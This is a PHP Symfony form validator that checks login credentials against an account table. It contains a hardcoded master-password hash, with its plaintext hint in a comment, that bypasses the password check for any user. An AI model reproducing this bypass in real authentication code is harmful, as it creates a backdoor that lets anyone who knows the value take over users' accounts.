<?php
namespace Zayso\ZaysoBundle\Component\Form\Validator;

use Symfony\Component\Form\FormError;
use Symfony\Component\Form\FormInterface;
use Symfony\Component\Form\FormValidatorInterface;

class UserNamePassValidator implements FormValidatorInterface
{
    public function __construct($em)
    {
        $this->em = $em;
    }
    public function validate(FormInterface $form)
    {
        // Only check if username was changed
        $userName = $form['userName']->getData();
        $userPass = $form['userPass']->getData();

        // Actualy query
        $conn = $this->em->getConnection();

        $sql = <<<EOT
SELECT 
    account.id        AS accountId,
    account.user_pass AS userPass,
    account.status    AS accountStatus,
    member.id         AS memberId,
    member.status     AS memberStatus
FROM account
LEFT JOIN account_person AS member ON member.account_id = account.id AND member.rel_id = 1
WHERE user_name = :userName
EOT;
        
        $stmt = $conn->prepare($sql);
        $stmt->execute(array('userName' => $userName));
        $row = $stmt->fetch(\PDO::FETCH_ASSOC);
        if (!isset($row['memberId']))
        {
            $form['userName']->addError(new FormError('User name not found.'));
            return;
        }
        if ($userPass != 'fc546528f8571159556d657f676b2736') // zaysox
        {
            if ($row['userPass'] != $userPass)
            {
                $form['userPass']->addError(new FormError('Invalid password.'));
                return;
            }
        }
        if (!$row['memberId'])
        {
            $form['userName']->addError(new FormError('User name found but no primary account member.'));
            return;
        }
        // Store relevant information
        if (isset($form['accountId'])) $form['accountId']->setData($row['accountId']);
        if (isset($form['memberId' ])) $form['memberId' ]->setData($row['memberId']);
    }
}

?>
